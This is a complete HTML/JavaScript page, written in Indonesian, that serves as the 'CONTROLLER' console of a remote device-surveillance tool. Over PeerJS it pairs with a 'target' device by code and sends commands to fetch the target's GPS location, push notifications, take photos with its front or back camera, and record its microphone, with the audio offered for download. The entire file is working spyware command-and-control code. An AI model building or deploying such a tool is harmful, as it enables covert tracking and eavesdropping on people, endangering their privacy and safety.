<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
  <title>CONTROLLER - Mengontrol</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: linear-gradient(135deg, #0277bd, #4fc3f7);
      font-family: system-ui, sans-serif;
      min-height: 100vh;
      padding: 20px;
    }
    .container {
      max-width: 550px;
      margin: 0 auto;
      background: white;
      border-radius: 40px;
      padding: 24px;
    }
    h1 { color: #0277bd; font-size: 1.6rem; }
    .pair-section {
      background: #e1f5fe;
      border-radius: 28px;
      padding: 16px;
      margin: 15px 0;
    }
    .pair-input { display: flex; gap: 10px; margin-top: 10px; flex-wrap: wrap; }
    .pair-input input { flex:1; padding: 12px 16px; border-radius: 48px; border: 1px solid #4fc3f7; }
    .pair-input button { background: #0288d1; border: none; padding: 12px 20px; border-radius: 48px; color: white; font-weight: bold; cursor: pointer; }
    .status-conn { background: #0d47a1; color: white; padding: 10px; border-radius: 40px; text-align: center; margin: 15px 0; font-weight: bold; }
    .connected { background: #2e7d32; }
    .btn-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; margin: 15px 0; }
    .ctrl-btn { background: white; border: 2px solid #4fc3f7; border-radius: 48px; padding: 12px; font-weight: bold; color: #0277bd; cursor: pointer; }
    .ctrl-btn:disabled { opacity: 0.4; }
    .result-area { background: #f5f5f5; border-radius: 24px; padding: 16px; max-height: 400px; overflow-y: auto; }
    .result-item { background: white; padding: 12px; border-radius: 16px; margin-bottom: 8px; font-size: 0.8rem; }
    img { max-width: 100%; border-radius: 12px; margin-top: 8px; cursor: pointer; }
    audio { width: 100%; margin-top: 8px; }
    .camera-panel { background: #eef5fc; border-radius: 24px; padding: 16px; margin-bottom: 12px; }
    .cam-choice { background: #e1f5fe; padding: 10px; border-radius: 40px; border: none; margin: 5px; cursor: pointer; font-weight: bold; }
    video { width: 100%; max-width: 280px; border-radius: 20px; background: #000; margin-top: 10px; }
    .google-link { background: #0288d1; color: white; padding: 6px 12px; border-radius: 40px; text-decoration: none; display: inline-block; margin-top: 6px; font-size: 0.7rem; }
  </style>
</head>
<body>
<div class="container">
  <h1>🎮 CONTROLLER</h1>
  <div class="pair-section">
    <div>🔗 Kode Pairing Target</div>
    <div class="pair-input">
      <input type="text" id="peerId" placeholder="Masukkan kode dari target">
      <button id="connectBtn">Hubungkan</button>
    </div>
  </div>
  <div class="status-conn" id="connStatus">⚪ Belum terhubung</div>
  <div class="btn-grid">
    <button class="ctrl-btn" id="btnLoc" disabled>🗾 Lokasi</button>
    <button class="ctrl-btn" id="btnNotif" disabled>🔔 Notifikasi</button>
    <button class="ctrl-btn" id="btnCam" disabled>📷 Kamera</button>
    <button class="ctrl-btn" id="btnMic" disabled>🎙️ Mikrofon</button>
  </div>
  <div class="result-area" id="resultArea"><div class="result-item">Hubungkan ke target terlebih dahulu</div></div>
</div>
<script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
<script>
  let peer, conn, isConnected = false;
  let previewStream = null, currentFacing = 'environment';
  const resultDiv = document.getElementById('resultArea');
  const connStatus = document.getElementById('connStatus');

  function addResult(type, data, isErr=false) {
    const div = document.createElement('div'); div.className = 'result-item';
    div.style.borderLeft = isErr ? '4px solid #f44336' : '4px solid #4caf50';
    let html = `<strong>📌 ${type.toUpperCase()}</strong><br>`;
    if(isErr) html += `⚠️ ${data.error || data}`;
    else {
      if(type === 'location') html += `📍 ${data.lat}, ${data.lng}<br>🎯 ±${Math.round(data.accuracy)}m<br><a href="https://www.google.com/maps?q=${data.lat},${data.lng}" target="_blank" class="google-link">🗺 Buka Google Maps</a>`;
      else if(type === 'notification') html += `🔔 "${data.message}"`;
      else if(type === 'photo') html += `📸 <img src="${data.image}" class="result-img" onclick="window.open(this.src)"><br><i>Klik gambar untuk zoom</i>`;
      else if(type === 'audio') html += `🎵 <audio controls src="${data.audio}"></audio><br><a href="${data.audio}" download="rekaman_${Date.now()}.mp3">💾 Download MP3</a>`;
      else if(type === 'recording_started') html += `🎙️ Merekam... (stop otomatis 15dtk)`;
      else html += JSON.stringify(data);
    }
    div.innerHTML = html;
    resultDiv.prepend(div);
    while(resultDiv.children.length > 20) resultDiv.removeChild(resultDiv.lastChild);
  }

  function sendCmd(type, extra={}) {
    if(!conn || !conn.open) { addResult('error',{error:'Tidak terhubung'},true); return; }
    conn.send({type, ...extra});
    addResult('command', `📤 ${type}`);
  }

  // KAMERA dengan preview
  async function showCamera() {
    const existing = document.getElementById('camPanel');
    if(existing) { if(previewStream) previewStream.getTracks().forEach(t=>t.stop()); existing.remove(); }
    if(!isConnected) { addResult('error',{error:'Hubungkan ke target dulu'},true); return; }
    
    const panel = document.createElement('div'); panel.id = 'camPanel'; panel.className = 'camera-panel';
    const btnDiv = document.createElement('div');
    const frontBtn = document.createElement('button'); frontBtn.innerText = '🤳 Depan (Mirror)'; frontBtn.className = 'cam-choice';
    const backBtn = document.createElement('button'); backBtn.innerText = '📸 Belakang'; backBtn.className = 'cam-choice';
    btnDiv.appendChild(frontBtn); btnDiv.appendChild(backBtn);
    
    const video = document.createElement('video'); video.autoplay = true; video.playsInline = true; video.muted = true;
    video.style.width = '100%'; video.style.maxWidth = '280px';
    
    const info = document.createElement('div'); info.style.fontSize='0.7rem'; info.style.margin='10px 0'; info.style.color='#0288d1';
    info.innerHTML = '📷 Preview kamera ANDA<br>↓ Pilih kamera dulu ↓';
    
    const captureBtn = document.createElement('button'); captureBtn.innerText = '📸 Ambil Foto dari Target'; captureBtn.style.background='#0288d1'; captureBtn.style.color='white'; captureBtn.style.border='none'; captureBtn.style.padding='12px'; captureBtn.style.borderRadius='40px'; captureBtn.style.fontWeight='bold'; captureBtn.style.width='100%'; captureBtn.style.marginTop='10px'; captureBtn.style.cursor='pointer';
    const closeBtn = document.createElement('button'); closeBtn.innerText = '❌ Tutup'; closeBtn.style.background='#ff8a65'; closeBtn.style.border='none'; closeBtn.style.padding='10px'; closeBtn.style.borderRadius='40px'; closeBtn.style.marginTop='8px'; closeBtn.style.width='100%'; closeBtn.style.cursor='pointer';
    
    panel.appendChild(btnDiv); panel.appendChild(video); panel.appendChild(info); panel.appendChild(captureBtn); panel.appendChild(closeBtn);
    resultDiv.prepend(panel);
    
    let curStream = null;
    async function startPreview(facing, mirror) {
      if(curStream) curStream.getTracks().forEach(t=>t.stop());
      try {
        let s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: facing } } });
        curStream = s; previewStream = s;
        video.srcObject = s;
        video.style.transform = mirror ? 'scaleX(-1)' : 'scaleX(1)';
        currentFacing = facing;
        addResult('info', `Preview ${mirror?'DEPAN':'BELAKANG'} aktif`);
      } catch(e) {
        try {
          let s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } });
          curStream = s; previewStream = s;
          video.srcObject = s;
          video.style.transform = mirror ? 'scaleX(-1)' : 'scaleX(1)';
          currentFacing = facing;
        } catch(e2) { addResult('error',{error:'Gagal preview'},true); }
      }
    }
    
    frontBtn.onclick = () => startPreview('user', true);
    backBtn.onclick = () => startPreview('environment', false);
    captureBtn.onclick = () => { if(isConnected) { addResult('info', `📸 Meminta foto ${currentFacing==='user'?'DEPAN':'BELAKANG'}`); sendCmd('take_photo', {facingMode: currentFacing}); } else addResult('error',{error:'Koneksi putus'},true); };
    closeBtn.onclick = () => { if(curStream) curStream.getTracks().forEach(t=>t.stop()); panel.remove(); };
    startPreview('environment', false);
  }

  // MIKROFON
  let micPanel = null;
  function showMicrophone() {
    if(micPanel && micPanel.parentNode) micPanel.remove();
    if(!isConnected) { addResult('error',{error:'Hubungkan ke target dulu'},true); return; }
    const panel = document.createElement('div'); panel.id = 'micPanel'; panel.style.background='#eef5fc'; panel.style.borderRadius='24px'; panel.style.padding='16px'; panel.style.marginBottom='12px';
    const status = document.createElement('span'); status.id = 'micStatus'; status.innerText = '🎤 Belum merekam'; status.style.display='block'; status.style.marginBottom='12px'; status.style.fontWeight='bold';
    const startBtn = document.createElement('button'); startBtn.innerText = '🎙️ Mulai Rekam'; startBtn.style.background='#0288d1'; startBtn.style.color='white'; startBtn.style.border='none'; startBtn.style.padding='12px'; startBtn.style.borderRadius='40px'; startBtn.style.marginRight='10px'; startBtn.style.cursor='pointer';
    const stopBtn = document.createElement('button'); stopBtn.innerText = '⏹️ Stop & Kirim'; stopBtn.style.background='#f44336'; stopBtn.style.color='white'; stopBtn.style.border='none'; stopBtn.style.padding='12px'; stopBtn.style.borderRadius='40px'; stopBtn.style.cursor='pointer'; stopBtn.disabled=true;
    const closeBtn = document.createElement('button'); closeBtn.innerText = '❌ Tutup'; closeBtn.style.background='#ff8a65'; closeBtn.style.border='none'; closeBtn.style.padding='10px'; closeBtn.style.borderRadius='40px'; closeBtn.style.marginTop='10px'; closeBtn.style.width='100%'; closeBtn.style.cursor='pointer';
    let active = false, timer;
    startBtn.onclick = () => { sendCmd('start_record'); startBtn.disabled=true; stopBtn.disabled=false; status.innerText='🔴 MEREKAM...'; status.style.color='#d32f2f'; active=true;
      timer = setTimeout(()=>{ if(active){ sendCmd('stop_record'); startBtn.disabled=false; stopBtn.disabled=true; status.innerText='🎤 Selesai'; active=false; } },15000);
    };
    stopBtn.onclick = () => { sendCmd('stop_record'); clearTimeout(timer); startBtn.disabled=false; stopBtn.disabled=true; status.innerText='🎤 Dihentikan'; active=false; };
    closeBtn.onclick = () => { clearTimeout(timer); panel.remove(); micPanel=null; };
    panel.appendChild(status); panel.appendChild(startBtn); panel.appendChild(stopBtn); panel.appendChild(closeBtn);
    resultDiv.prepend(panel); micPanel = panel;
  }

  // KONEKSI
  function connectToPeer(id) {
    if(conn) conn.close();
    conn = peer.connect(id);
    conn.on('open', () => { isConnected=true; connStatus.innerHTML = `✅ Terhubung ke ${id.substring(0,12)}...`; connStatus.className = 'status-conn connected'; document.querySelectorAll('.ctrl-btn').forEach(b=>b.disabled=false); addResult('connection','Berhasil terhubung'); });
    conn.on('data', d => { if(d.response) addResult(d.type, d.data, d.data?.error); });
    conn.on('close', () => { isConnected=false; connStatus.innerHTML = '⚠️ Putus'; connStatus.className = 'status-conn'; document.querySelectorAll('.ctrl-btn').forEach(b=>b.disabled=true); addResult('connection','Koneksi putus',true); });
    conn.on('error', e => addResult('error',{error:e},true));
  }

  function init() {
    peer = new Peer();
    peer.on('open', id => console.log('Controller ID:', id));
    peer.on('error', e => console.log(e));
    document.getElementById('connectBtn').onclick = () => { let id = document.getElementById('peerId').value.trim(); if(id) connectToPeer(id); else addResult('error',{error:'Masukkan kode'},true); };
    document.getElementById('btnLoc').onclick = () => sendCmd('location');
    document.getElementById('btnNotif').onclick = () => { let msg = prompt('Pesan notifikasi:'); if(msg) sendCmd('notification',{message:msg}); };
    document.getElementById('btnCam').onclick = showCamera;
    document.getElementById('btnMic').onclick = showMicrophone;
  }
  if('Notification' in window) Notification.requestPermission();
  init();
</script>
</body>
</html>
